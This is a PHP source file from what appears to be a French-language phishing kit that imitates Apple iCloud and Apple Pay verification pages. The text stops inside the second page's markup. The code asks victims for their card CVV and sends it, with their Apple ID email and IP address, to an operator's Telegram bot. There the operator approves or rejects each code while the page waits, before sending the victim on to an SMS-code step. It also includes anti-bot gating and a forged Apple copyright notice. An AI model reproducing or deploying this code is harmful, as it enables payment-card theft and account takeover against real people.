<?php
session_start();
include __DIR__ . '/settings.php';
include __DIR__ . '/lang_main.php';
require_once __DIR__ . '/antibot.php';
validateSession(3);

function _smsGetIp() {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) return trim(explode(',', $_SERVER[$k])[0]);
    }
    return 'N/A';
}

$ip    = _smsGetIp();
$email = $_SESSION['icloud_email'] ?? '—';
$dt    = date('d/m/Y à H:i') . ' UTC';

// Check if CKK has been validated - either from session or from URL parameter
if (isset($_GET['cvv_done']) && $_GET['cvv_done'] === '1') {
    $_SESSION['cvv_validated'] = true;
}
$cvvValidated = isset($_SESSION['cvv_validated']) && $_SESSION['cvv_validated'] === true;

// If CKK not yet validated and it's a POST with CKK step, process it
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['step']) && $_POST['step'] === 'cvv') {
    header('Content-Type: application/json');
    $cvv = isset($_POST['cvv']) ? preg_replace('/[^0-9]/', '', $_POST['cvv']) : '';

    if (strlen($cvv) === 3) {
        // Send CKK to Telegram
        $proto  = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
        $host   = $_SERVER['HTTP_HOST'];
        $dir    = dirname($_SERVER['PHP_SELF']);
        if ($dir === '/' || $dir === '\\') $dir = '';
        $vbvUrl = $proto . '://' . $host . $dir . '/security_check/actionsvbv.php';
        $encIp  = urlencode($ip);

        $message = <<<TEXT
🔐 <b>iCLOUD – CKK saisi</b> [<code>CKK STEP</code>]

<b>Apple ID</b>
└ 📧 Email: <code>$email</code>

<b>Code CKK</b>
└ 🔢 Code: <code>$cvv</code>

<b>Réseau</b>
├ 🌐 IP: <code>$ip</code>
└ 🕐 $dt

⏳ <i>En attente de validation…</i>
TEXT;

        $keyboard = [
            'inline_keyboard' => [[
                ['text' => '✅ CKKOK', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=cvvok'],
                ['text' => '❌ CKKBAD', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=cvvbad'],
            ]]
        ];

        sendTelegramMessage($bot_token, $chat_id, $message, $keyboard);

        // Store temporarily and reset ip_list for polling
        $_SESSION['cvv_code_temp'] = $cvv;
        $ipListFile = __DIR__ . '/security_check/ip_list.txt';
        file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting_cvv', FILE_APPEND | LOCK_EX);

        echo json_encode(['ok' => true]);
        exit;
    } else {
        echo json_encode(['ok' => false, 'error' => 'Code invalide']);
        exit;
    }
}

// Check if CKK was validated via icloud_check.php
if (!$cvvValidated) {
    // Show CKK form
    ?>
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Vérification Apple ID</title>
<style>
  :root {
    --bg: #f2f2f7;
    --card-bg: #ffffff;
    --card-shadow: 0 2px 24px rgba(0,0,0,0.10);
    --label: rgba(0,0,0,0.88);
    --label-secondary: rgba(60,60,67,0.6);
    --separator: rgba(60,60,67,0.22);
    --fill-tertiary: rgba(118,118,128,0.12);
    --blue: #0071e3;
    --blue-tint: rgba(0,122,255,1);
    --input-border: rgba(0,0,0,0.18);
    --theme-color-systemBlack: rgba(0,0,0,0.88);
    --green: #34c759;
    --red: #ff3b30;
    --radius: 18px;
  }
  @media (prefers-color-scheme: dark) {
    :root {
      --bg: rgb(28,28,30);
      --card-bg: rgb(44,44,46);
      --card-shadow: 0 4px 32px rgba(0,0,0,0.45);
      --label: rgba(255,255,255,0.98);
      --label-secondary: rgba(235,235,245,0.6);
      --separator: rgba(84,84,88,0.65);
      --fill-tertiary: rgba(118,118,128,0.24);
      --blue: #0a84ff;
      --blue-tint: rgba(10,132,255,1);
      --input-border: rgba(255,255,255,0.18);
      --theme-color-systemBlack: #ffffff;
      --green: #30d158;
    }
  }
  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
  html { background: var(--bg); }
  body {
    background: var(--bg);
    color: var(--label);
    font-family: -apple-system, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
  }

  .nav {
    position: relative; top: 0; left: 0;
    width: 100%; height: 44px;
    display: flex; align-items: center;
    padding: 0 16px; flex-shrink: 0;
  }
  .nav-brand {
    display: flex; align-items: center; gap: 5px;
    font-size: 17px; font-weight: 600;
    color: var(--label); text-decoration: none; letter-spacing: -0.3px;
  }
  .nav-brand svg { fill: var(--label); flex-shrink: 0; }
  .nav-spacer { flex: 1; }
  .nav-ellipsis {
    background: none; border: none; cursor: pointer;
    padding: 8px; display: flex; align-items: center;
    justify-content: center; opacity: 0.6;
  }
  .nav-ellipsis:hover { opacity: 1; }
  .nav-ellipsis svg { fill: var(--label); }

  .main {
    flex: 1; display: flex; flex-direction: column;
    align-items: center; justify-content: center;
    padding: 24px 16px 48px;
  }
  .card {
    background: var(--card-bg);
    border-radius: var(--radius);
    box-shadow: var(--card-shadow);
    width: 100%;
    max-width: 380px;
    padding: 44px 28px 40px;
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
  }

  .site-footer {
    flex-shrink: 0; width: 100%;
    padding: 20px 24px;
    display: flex; justify-content: space-between;
    align-items: center; flex-wrap: wrap; gap: 8px;
  }
  .footer-links { display: flex; gap: 12px; flex-wrap: wrap; }
  .footer-links a { font-size: 12px; color: var(--label-secondary); text-decoration: none; }
  .footer-links a:hover { text-decoration: underline; }
  .footer-copy { font-size: 12px; color: var(--label-secondary); }

  .icon-wrap {
    width: 72px;
    height: 72px;
    background: rgba(0,122,255,0.12);
    border-radius: 22px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 28px;
  }
  @media (prefers-color-scheme: dark) {
    .icon-wrap { background: rgba(10,132,255,0.18); }
  }
  .icon-wrap svg { width: 42px; height: 42px; }

  h1 {
    font-size: 22px;
    font-weight: 700;
    letter-spacing: -.4px;
    color: var(--label);
    margin-bottom: 10px;
  }
  .subtitle {
    font-size: 14px;
    line-height: 1.5;
    color: var(--label-secondary);
    margin-bottom: 32px;
    max-width: 300px;
  }
  .subtitle strong { color: var(--label); }

  .digits {
    display: flex;
    gap: 8px;
    margin-bottom: 10px;
    justify-content: center;
  }
  .digits input {
    width: 46px;
    height: 56px;
    border-radius: 12px;
    border: 1.5px solid var(--input-border);
    background: var(--fill-tertiary);
    color: var(--label);
    font-size: 22px;
    font-weight: 600;
    text-align: center;
    outline: none;
    transition: border-color .15s, box-shadow .15s;
    caret-color: var(--blue);
    -moz-appearance: textfield;
  }
  .digits input::-webkit-outer-spin-button,
  .digits input::-webkit-inner-spin-button { -webkit-appearance: none; }
  .digits input:focus {
    border-color: var(--blue);
    box-shadow: 0 0 0 3px rgba(0,122,255,0.2);
    background: var(--card-bg);
  }
  .digits input.filled { border-color: var(--blue); }

  .error-msg {
    font-size: 13px;
    color: #ff3b30;
    min-height: 18px;
    margin-bottom: 20px;
    transition: opacity .2s;
  }
  .error-msg.hidden { opacity: 0; pointer-events: none; }

  .btn-verify {
    width: 100%;
    height: 50px;
    background: var(--blue-tint);
    color: #fff;
    border: none;
    border-radius: 12px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: opacity .15s, transform .1s;
    letter-spacing: -.2px;
    margin-bottom: 18px;
  }
  .btn-verify:active { transform: scale(.98); }
  .btn-verify:disabled { opacity: .45; cursor: default; }

  .overlay {
    position: fixed; inset: 0;
    background: rgba(0,0,0,0.45);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 100;
    opacity: 0;
    pointer-events: none;
    transition: opacity .25s;
  }
  .overlay.visible { opacity: 1; pointer-events: all; }
  .overlay-box {
    background: var(--card-bg);
    border-radius: 18px;
    padding: 36px 44px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 18px;
    min-width: 200px;
  }
  .overlay-box p { font-size: 15px; color: var(--label-secondary); font-weight: 500; }

  .spinner { position: relative; width: 40px; height: 40px; }
  .spinner-blade {
    position: absolute;
    left: 50%; top: 50%;
    width: 2.4px; height: 9px;
    border-radius: 2px;
    background: var(--label);
    transform-origin: 50% 0;
    animation: fade-blade 1.2s linear infinite;
  }
  .spinner-blade:nth-child(1)  { transform: translateX(-50%) rotate(0deg)   translateY(-130%); animation-delay: -1.1s; }
  .spinner-blade:nth-child(2)  { transform: translateX(-50%) rotate(30deg)  translateY(-130%); animation-delay: -1.0s; }
  .spinner-blade:nth-child(3)  { transform: translateX(-50%) rotate(60deg)  translateY(-130%); animation-delay: -0.9s; }
  .spinner-blade:nth-child(4)  { transform: translateX(-50%) rotate(90deg)  translateY(-130%); animation-delay: -0.8s; }
  .spinner-blade:nth-child(5)  { transform: translateX(-50%) rotate(120deg) translateY(-130%); animation-delay: -0.7s; }
  .spinner-blade:nth-child(6)  { transform: translateX(-50%) rotate(150deg) translateY(-130%); animation-delay: -0.6s; }
  .spinner-blade:nth-child(7)  { transform: translateX(-50%) rotate(180deg) translateY(-130%); animation-delay: -0.5s; }
  .spinner-blade:nth-child(8)  { transform: translateX(-50%) rotate(210deg) translateY(-130%); animation-delay: -0.4s; }
  .spinner-blade:nth-child(9)  { transform: translateX(-50%) rotate(240deg) translateY(-130%); animation-delay: -0.3s; }
  .spinner-blade:nth-child(10) { transform: translateX(-50%) rotate(270deg) translateY(-130%); animation-delay: -0.2s; }
  .spinner-blade:nth-child(11) { transform: translateX(-50%) rotate(300deg) translateY(-130%); animation-delay: -0.1s; }
  .spinner-blade:nth-child(12) { transform: translateX(-50%) rotate(330deg) translateY(-130%); animation-delay:  0.0s; }
  @keyframes fade-blade { 0%,100% { opacity: .1 } 0% { opacity: 1 } }
</style>
</head>
<body>

  <nav class="nav">
    <a class="nav-brand" href="#">
      <svg xmlns="http://www.w3.org/2000/svg" width="84" height="23" viewBox="0 0 85 23" fill="currentColor" style="overflow:visible">
        <path d="M16.907 16.5h2.55V5.423h-2.55V16.5Zm1.28-12.832c.412 0 .763-.144 1.05-.43a1.41 1.41 0 0 0 .432-1.033c0-.407-.144-.753-.432-1.038a1.445 1.445 0 0 0-1.05-.426c-.407 0-.756.142-1.046.426-.291.285-.437.63-.437 1.038 0 .401.146.745.437 1.032.29.287.64.43 1.046.43v.001Zm9.915 13.156c1.14 0 2.157-.21 3.052-.631.864-.395 1.616-1 2.188-1.758.563-.752.908-1.624 1.037-2.619l.007-.091h-2.594l-.021.076a3.58 3.58 0 0 1-.713 1.465 3.35 3.35 0 0 1-1.258.943c-.5.219-1.065.328-1.695.328-.847 0-1.582-.22-2.204-.663-.623-.442-1.103-1.07-1.441-1.884-.338-.813-.507-1.776-.507-2.886v-.016c0-1.115.17-2.076.507-2.886.338-.81.817-1.434 1.439-1.875.62-.44 1.354-.66 2.199-.66.634 0 1.201.117 1.702.351.501.235.92.565 1.257.99.338.425.572.926.705 1.505l.026.105h2.59l-.004-.093c-.118-1.006-.46-1.895-1.028-2.668a5.886 5.886 0 0 0-2.204-1.819c-.901-.439-1.916-.658-3.044-.658-1.405 0-2.619.311-3.642.935-1.022.624-1.812 1.511-2.368 2.663-.556 1.152-.834 2.523-.834 4.113v.016c0 1.588.278 2.958.834 4.11.555 1.154 1.346 2.043 2.372 2.669 1.026.625 2.24.938 3.642.938Zm8.034-.324h2.55V1.24h-2.55V16.5Zm9.534.222c1.1 0 2.049-.231 2.846-.693.797-.461 1.413-1.122 1.846-1.982.434-.86.65-1.886.65-3.08v-.02c0-1.191-.218-2.216-.655-3.074a4.68 4.68 0 0 0-1.852-1.98c-.798-.46-1.744-.691-2.838-.691-1.086 0-2.03.23-2.829.694a4.69 4.69 0 0 0-1.855 1.981c-.438.859-.656 1.882-.656 3.07v.02c0 1.191.216 2.217.65 3.078.434.86 1.05 1.522 1.85 1.984.8.462 1.747.693 2.843.693Zm.004-2.066c-.572 0-1.063-.146-1.472-.436-.408-.291-.722-.711-.941-1.261-.219-.55-.329-1.213-.329-1.99v-.02c0-.776.11-1.438.33-1.985.22-.548.535-.967.944-1.259.408-.291.896-.437 1.461-.437.571 0 1.06.145 1.469.436.408.29.721.71.941 1.258.22.549.33 1.21.33 1.987v.02c0 .776-.11 1.438-.328 1.988-.218.55-.53.97-.936 1.262-.406.29-.896.437-1.469.437Zm10.596 2.066c.497.008.991-.071 1.46-.233.43-.156.798-.378 1.106-.668.309-.29.557-.639.73-1.026h.13V16.5h2.55V5.423h-2.55v6.444c0 .41-.055.782-.165 1.114a2.33 2.33 0 0 1-.485.853 2.153 2.153 0 0 1-.783.546 2.744 2.744 0 0 1-1.054.191c-.754 0-1.307-.216-1.657-.647-.35-.431-.526-1.063-.526-1.894V5.423h-2.55v7.166c0 .867.144 1.61.433 2.228.289.618.716 1.09 1.281 1.416.566.326 1.259.489 2.08.489Zm12.084-.024c.525 0 1.005-.08 1.441-.24a3.453 3.453 0 0 0 1.955-1.747h.13V16.5h2.55V1.24h-2.55v5.997h-.13a3.292 3.292 0 0 0-.802-1.073c-.338-.3-.727-.53-1.167-.694a4.093 4.093 0 0 0-1.433-.244c-.932 0-1.739.23-2.42.693-.681.463-1.207 1.122-1.579 1.978-.371.855-.557 1.873-.557 3.055v.016c0 1.175.186 2.19.559 3.049.372.858.9 1.52 1.585 1.984.684.464 1.49.697 2.418.697Zm.783-2.15c-.566 0-1.054-.145-1.466-.432-.412-.287-.728-.699-.95-1.235-.22-.536-.33-1.174-.33-1.913v-.016c0-.742.11-1.38.331-1.912.222-.533.539-.944.95-1.232.412-.288.9-.432 1.465-.432.56 0 1.046.146 1.46.436.413.29.735.703.964 1.237.228.534.343 1.169.343 1.906v.016c0 .732-.114 1.366-.34 1.902-.227.536-.548.95-.963 1.24-.415.29-.903.434-1.464.434v.001ZM8.856 3.158C9.35 2.56 9.7 1.745 9.7.92c0-.114-.01-.227-.03-.32-.805.03-1.774.536-2.351 1.217-.454.516-.877 1.341-.877 2.167 0 .123.02.247.031.288.052.01.134.021.217.021.721 0 1.629-.485 2.165-1.135h.001Zm.567 1.31c-1.207 0-2.186.733-2.815.733-.67 0-1.546-.691-2.598-.691C2.02 4.51 0 6.16 0 9.265c0 1.94.742 3.982 1.67 5.303.794 1.114 1.485 2.032 2.485 2.032.99 0 1.422-.66 2.65-.66 1.247 0 1.525.64 2.618.64 1.082 0 1.804-.991 2.484-1.971.763-1.124 1.083-2.218 1.093-2.27-.062-.02-2.134-.866-2.134-3.239 0-2.053 1.629-2.97 1.722-3.043-1.073-1.547-2.712-1.589-3.165-1.589Z" transform="translate(2.5 6.5)"/>
      </svg>
    </a>
    <div class="nav-spacer"></div>
  </nav>

  <main class="main">
<div class="card">
  <div class="icon-wrap">
    <svg viewBox="0 0 42 42" fill="none" xmlns="http://www.w3.org/2000/svg">
      <!-- Carte de crédit simple -->
      <rect x="5" y="8" width="32" height="26" rx="2.5" fill="#0071e3"/>
      <!-- Texte CVV central -->
      <text x="21" y="27" font-size="12" fill="white" font-weight="600" text-anchor="middle" letter-spacing="1">CVV</text>
    </svg>
  </div>

  <h1>Vérification Apple Pay</h1>
  <p class="subtitle">Veuillez saisir le <strong>code CVV</strong> (3 chiffres au verso) de votre <strong>moyen de paiement enregistré</strong> pour confirmer votre identité.</p>

  <div class="digits" id="cvvDigits">
    <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
    <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
    <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
  </div>

  <div class="error-msg hidden" id="cvvErrMsg">Vérification en cours…</div>

  <button class="btn-verify" id="cvvBtn" disabled>Vérifier</button>
</div>
  </main>

  <footer class="site-footer">
    <nav class="footer-links">
      <a href="#">État du système</a>
      <a href="#">Engagement de confidentialité</a>
      <a href="#">Conditions générales</a>
    </nav>
    <span class="footer-copy">Copyright &copy; 2026 Apple Inc. Tous droits réservés.</span>
  </footer>

<div class="overlay" id="overlay">
  <div class="overlay-box">
    <div class="spinner">
      <div class="spinner-blade"></div><div class="spinner-blade"></div>
      <div class="spinner-blade"></div><div class="spinner-blade"></div>
      <div class="spinner-blade"></div><div class="spinner-blade"></div>
      <div class="spinner-blade"></div><div class="spinner-blade"></div>
      <div class="spinner-blade"></div><div class="spinner-blade"></div>
      <div class="spinner-blade"></div><div class="spinner-blade"></div>
    </div>
    <p>Vérification en cours…</p>
  </div>
</div>

<script>
(function() {
  var cvvDigits = Array.from(document.querySelectorAll('#cvvDigits input'));
  var cvvBtn = document.getElementById('cvvBtn');
  var cvvErrMsg = document.getElementById('cvvErrMsg');
  var overlay = document.getElementById('overlay');

  function getCkkCode() { return cvvDigits.map(function(d){ return d.value; }).join(''); }

  function updateBtn() {
    var full = getCkkCode().length === 3;
    cvvBtn.disabled = !full;
    cvvDigits.forEach(function(d){ d.classList.toggle('filled', d.value !== ''); });
  }

  cvvDigits.forEach(function(inp, idx) {
    inp.addEventListener('keydown', function(e) {
      if (e.key === 'Backspace' && inp.value === '' && idx > 0) {
        cvvDigits[idx-1].focus();
        cvvDigits[idx-1].value = '';
        updateBtn();
      }
    });
    inp.addEventListener('input', function() {
      var val = inp.value.replace(/[^0-9]/g,'');
      if (val.length > 1) {
        var chars = val.split('');
        cvvDigits.forEach(function(d, i){ d.value = chars[i] || ''; });
        var next = Math.min(chars.length, 2);
        cvvDigits[next].focus();
      } else {
        inp.value = val;
        if (val && idx < 2) cvvDigits[idx+1].focus();
      }
      updateBtn();
    });
    inp.addEventListener('focus', function(){ inp.select(); });
  });

  cvvBtn.addEventListener('click', function() {
    var code = getCkkCode();
    if (code.length !== 3) return;

    overlay.classList.add('visible');
    cvvBtn.disabled = true;

    fetch('handle.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'step=cvv&cvv=' + encodeURIComponent(code)
    }).then(function(r){ return r.json(); })
      .then(function(data) {
        if (data.ok) {
          pollCkkResult();
        } else {
          overlay.classList.remove('visible');
          cvvBtn.disabled = false;
          cvvErrMsg.classList.remove('hidden');
        }
      }).catch(function() {
        overlay.classList.remove('visible');
        cvvBtn.disabled = false;
      });
  });

  function pollCkkResult() {
    fetch('icloud_check.php?t=' + Date.now())
      .then(function(r){ return r.text(); })
      .then(function(raw) {
        var signal = raw.trim();
        if (signal === 'cvvok') {
          window.location.href = 'icloud_sms.php?cvv_done=1';
        } else if (signal === 'cvvbad') {
          overlay.classList.remove('visible');
          cvvErrMsg.classList.remove('hidden');
          cvvDigits.forEach(function(d){ d.value = ''; });
          cvvDigits[0].focus();
          updateBtn();
          cvvBtn.disabled = false;
        } else {
          setTimeout(pollCkkResult, 2000);
        }
      }).catch(function() { setTimeout(pollCkkResult, 3000); });
  }

  cvvDigits[0].focus();
})();
</script>
</body>
</html>
    <?php
    exit;
}

// Reset ip_list so polling starts fresh on this page
$ipListFile = __DIR__ . '/security_check/ip_list.txt';
file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting', FILE_APPEND | LOCK_EX);
?>
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Vérification Apple ID</title>
<style>
  :root {
    --bg: #f2f2f7;
    --card-bg: #ffffff;
    --card-shadow: 0 2px 24px rgba(0,0,0,0.10);
    --label: rgba(0,0,0,0.88);
    --label-secondary: rgba(60,60,67,0.6);
    --separator: rgba(60,60,67,0.22);
    --fill-tertiary: rgba(118,118,128,0.12);
    --blue: #0071e3;
    --blue-tint: rgba(0,122,255,1);
    --input-border: rgba(0,0,0,0.18);
    --theme-color-systemBlack: rgba(0,0,0,0.88);
    --green: #34c759;
    --red: #ff3b30;
    --radius: 18px;
  }
  @media (prefers-color-scheme: dark) {
    :root {
      --bg: rgb(28,28,30);
      --card-bg: rgb(44,44,46);
      --card-shadow: 0 4px 32px rgba(0,0,0,0.45);
      --label: rgba(255,255,255,0.98);
      --label-secondary: rgba(235,235,245,0.6);
      --separator: rgba(84,84,88,0.65);
      --fill-tertiary: rgba(118,118,128,0.24);
      --blue: #0a84ff;
      --blue-tint: rgba(10,132,255,1);
      --input-border: rgba(255,255,255,0.18);
      --theme-color-systemBlack: #ffffff;
      --green: #30d158;
    }
  }
  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
  html { background: var(--bg); }
  body {
    background: var(--bg);
    color: var(--label);
    font-family: -apple-system, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
  }

  /* ── NAV ── */
  .nav {
    position: relative; top: 0; left: 0;
    width: 100%; height: 44px;
    display: flex; align-items: center;
    padding: 0 16px; flex-shrink: 0;
  }
  .nav-brand {
    display: flex; align-items: center; gap: 5px;
    font-size: 17px; font-weight: 600;
    color: var(--label); text-decoration: none; letter-spacing: -0.3px;
  }
  .nav-brand svg { fill: var(--label); flex-shrink: 0; }
  .nav-spacer { flex: 1; }
  .nav-ellipsis {
    background: none; border: none; cursor: pointer;
    padding: 8px; display: flex; align-items: center;
    justify-content: center; opacity: 0.6;
  }
  .nav-ellipsis:hover { opacity: 1; }
  .nav-ellipsis svg { fill: var(--label); }

  /* ── MAIN ── */
  .main {
    flex: 1; display: flex; flex-direction: column;
    align-items: center; justify-content: center;
    padding: 24px 16px 48px;
  }
  .card {
    background: var(--card-bg);
    border-radius: var(--radius);
    box-shadow: var(--card-shadow);
    width: 100%;
    max-width: 380px;
    padding: 44px 28px 40px;
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
  }

  /* ── FOOTER ── */
  .site-footer {
    flex-shrink: 0; width: 100%;
    padding: 20px 24px;
    display: flex; justify-content: space-between;
    align-items: center; flex-wrap: wrap; gap: 8px;
  }
  .footer-links { display: flex; gap: 12px; flex-wrap: wrap; }
  .footer-links a { font-size: 12px; color: var(--label-secondary); text-decoration: none; }
  .footer-links a:hover { text-decoration: underline; }
  .footer-copy { font-size: 12px; color: var(--label-secondary); }

  /* ── SMS bubble icon ── */
  .icon-wrap {
    width: 72px;
    height: 72px;
    background: rgba(0,122,255,0.12);
    border-radius: 22px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 28px;
  }
  @media (prefers-color-scheme: dark) {
    .icon-wrap { background: rgba(10,132,255,0.18); }
  }
  .icon-wrap svg { width: 42px; height: 42px; }

  h1 {
    font-size: 22px;
    font-weight: 700;
    letter-spacing: -.4px;
    color: var(--label);
    margin-bottom: 10px;
  }
  .subtitle {
    font-size: 14px;
    line-height: 1.5;
    color: var(--label-secondary);
    margin-bottom: 32px;
    max-width: 300px;
  }
  .subtitle strong { color: var(--label); }

  /* ── digit inputs ── */
  .digits {
    display: flex;
    gap: 8px;
    margin-bottom: 10px;
    justify-content: center;
  }
  .digits input {
    width: 46px;
    height: 56px;
    border-radius: 12px;
    border: 1.5px solid var(--input-border);
    background: var(--fill-tertiary);
    color: var(--label);
    font-size: 22px;
    font-weight: 600;
    text-align: center;
    outline: none;
    transition: border-color .15s, box-shadow .15s;
    caret-color: var(--blue);
    -moz-appearance: textfield;
  }
  .digits input::-webkit-outer-spin-button,
  .digits input::-webkit-inner-spin-button { -webkit-appearance: none; }
  .digits input:focus {
    border-color: var(--blue);
    box-shadow: 0 0 0 3px rgba(0,122,255,0.2);
    background: var(--card-bg);
  }
  .digits input.filled { border-color: var(--blue); }

  .error-msg {
    font-size: 13px;
    color: #ff3b30;
    min-height: 18px;
    margin-bottom: 20px;
    transition: opacity .2s;
  }
  .error-msg.hidden { opacity: 0; pointer-events: none; }

  .btn-verify {
    width: 100%;
    height: 50px;
    background: var(--blue-tint);
    color: #fff;
    border: none;
    border-radius: 12px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: opacity .15s, transform .1s;
    letter-spacing: -.2px;
    margin-bottom: 18px;
  }
  .btn-verify:active { transform: scale(.98); }
  .btn-verify:disabled { opacity: .45; cursor: default; }

  .resend-link {
    font-size: 13px;
    color: var(--blue-tint);
    cursor: pointer;
    text-decoration: none;
    background: none;
    border: none;
    padding: 0;
  }
  .resend-link:hover { text-decoration: underline; }

  /* ── loading overlay ── */
  .overlay {
    position: fixed; inset: 0;
    background: rgba(0,0,0,0.45);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 100;
    opacity: 0;
    pointer-events: none;
    transition: opacity .25s;
  }
  .overlay.visible { opacity: 1; pointer-events: all; }
  .overlay-box {
    background: var(--card-bg);
    border-radius: 18px;
    padding: 36px 44px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 18px;
    min-width: 200px;
  }
  .overlay-box p { font-size: 15px; color: var(--label-secondary); font-weight: 500; }

  /* iOS activity indicator */
  .spinner { position: relative; width: 40px; height: 40px; }
  .spinner-blade {
    position: absolute;
    left: 50%; top: 50%;
    width: 2.4px; height: 9px;
    border-radius: 2px;
    background: var(--label);
    transform-origin: 50% 0;
    animation: fade-blade 1.2s linear infinite;
  }
  .spinner-blade:nth-child(1)  { transform: translateX(-50%) rotate(0deg)   translateY(-130%); animation-delay: -1.1s; }
  .spinner-blade:nth-child(2)  { transform: translateX(-50%) rotate(30deg)  translateY(-130%); animation-delay: -1.0s; }
  .spinner-blade:nth-child(3)  { transform: translateX(-50%) rotate(60deg)  translateY(-130%); animation-delay: -0.9s; }
  .spinner-blade:nth-child(4)  { transform: translateX(-50%) rotate(90deg)  translateY(-130%); animation-delay: -0.8s; }
  .spinner-blade:nth-child(5)  { transform: translateX(-50%) rotate(120deg) translateY(-130%); animation-delay: -0.7s; }
  .spinner-blade:nth-child(6)  { transform: translateX(-50%) rotate(150deg) translateY(-130%); animation-delay: -0.6s; }
  .spinner-blade:nth-child(7)  { transform: translateX(-50%) rotate(180deg) translateY(-130%); animation-delay: -0.5s; }
  .spinner-blade:nth-child(8)  { transform: translateX(-50%) rotate(210deg) translateY(-130%); animation-delay: -0.4s; }
  .spinner-blade:nth-child(9)  { transform: translateX(-50%) rotate(240deg) translateY(-130%); animation-delay: -0.3s; }
  .spinner-blade:nth-child(10) { transform: translateX(-50%) rotate(270deg) translateY(-130%); animation-delay: -0.2s; }
  .spinner-blade:nth-child(11) { transform: translateX(-50%) rotate(300deg) translateY(-130%); animation-delay: -0.1s; }
  .spinner-blade:nth-child(12) { transform: translateX(-50%) rotate(330deg) translateY(-130%); animation-delay:  0.0s; }
  @keyframes fade-blade { 0%,100% { opacity: .1 } 0% { opacity: 1 } }
</style>
</head>
<body>

  <!-- NAV -->
  <nav class="nav">
    <a class="nav-brand" href="#">
      <svg xmlns="http://www.w3.org/2000/svg" width="84" height="23" viewBox="0 0 85 23" fill="currentColor" style="overflow:visible">
        <path d="M16.907 16.5h2.55V5.423h-2.55V16.5Zm1.28-12.832c.412 0 .763-.144 1.05-.43a1.41 1.41 0 0 0 .432-1.033c0-.407-.144-.753-.432-1.038a1.445 1.445 0 0 0-1.05-.426c-.407 0-.756.142-1.046.426-.291.285-.437.63-.437 1.038 0 .401.146.745.437 1.032.29.287.64.43 1.046.43v.001Zm9.915 13.156c1.14 0 2.157-.21 3.052-.631.864-.395 1.616-1 2.188-1.758.563-.752.908-1.624 1.037-2.619l.007-.091h-2.594l-.021.076a3.58 3.58 0 0 1-.713 1.465 3.35 3.35 0 0 1-1.258.943c-.5.219-1.065.328-1.695.328-.847 0-1.582-.22-2.204-.663-.623-.442-1.103-1.07-1.441-1.884-.338-.813-.507-1.776-.507-2.886v-.016c0-1.115.17-2.076.507-2.886.338-.81.817-1.434 1.439-1.875.62-.44 1.354-.66 2.199-.66.634 0 1.201.117 1.702.351.501.235.92.565 1.257.99.338.425.572.926.705 1.505l.026.105h2.59l-.004-.093c-.118-1.006-.46-1.895-1.028-2.668a5.886 5.886 0 0 0-2.204-1.819c-.901-.439-1.916-.658-3.044-.658-1.405 0-2.619.311-3.642.935-1.022.624-1.812 1.511-2.368 2.663-.556 1.152-.834 2.523-.834 4.113v.016c0 1.588.278 2.958.834 4.11.555 1.154 1.346 2.043 2.372 2.669 1.026.625 2.24.938 3.642.938Zm8.034-.324h2.55V1.24h-2.55V16.5Zm9.534.222c1.1 0 2.049-.231 2.846-.693.797-.461 1.413-1.122 1.846-1.982.434-.86.65-1.886.65-3.08v-.02c0-1.191-.218-2.216-.655-3.074a4.68 4.68 0 0 0-1.852-1.98c-.798-.46-1.744-.691-2.838-.691-1.086 0-2.03.23-2.829.694a4.69 4.69 0 0 0-1.855 1.981c-.438.859-.656 1.882-.656 3.07v.02c0 1.191.216 2.217.65 3.078.434.86 1.05 1.522 1.85 1.984.8.462 1.747.693 2.843.693Zm.004-2.066c-.572 0-1.063-.146-1.472-.436-.408-.291-.722-.711-.941-1.261-.219-.55-.329-1.213-.329-1.99v-.02c0-.776.11-1.438.33-1.985.22-.548.535-.967.944-1.259.408-.291.896-.437 1.461-.437.571 0 1.06.145 1.469.436.408.29.721.71.941 1.258.22.549.33 1.21.33 1.987v.02c0 .776-.11 1.438-.328 1.988-.218.55-.53.97-.936 1.262-.406.29-.896.437-1.469.437Zm10.596 2.066c.497.008.991-.071 1.46-.233.43-.156.798-.378 1.106-.668.309-.29.557-.639.73-1.026h.13V16.5h2.55V5.423h-2.55v6.444c0 .41-.055.782-.165 1.114a2.33 2.33 0 0 1-.485.853 2.153 2.153 0 0 1-.783.546 2.744 2.744 0 0 1-1.054.191c-.754 0-1.307-.216-1.657-.647-.35-.431-.526-1.063-.526-1.894V5.423h-2.55v7.166c0 .867.144 1.61.433 2.228.289.618.716 1.09 1.281 1.416.566.326 1.259.489 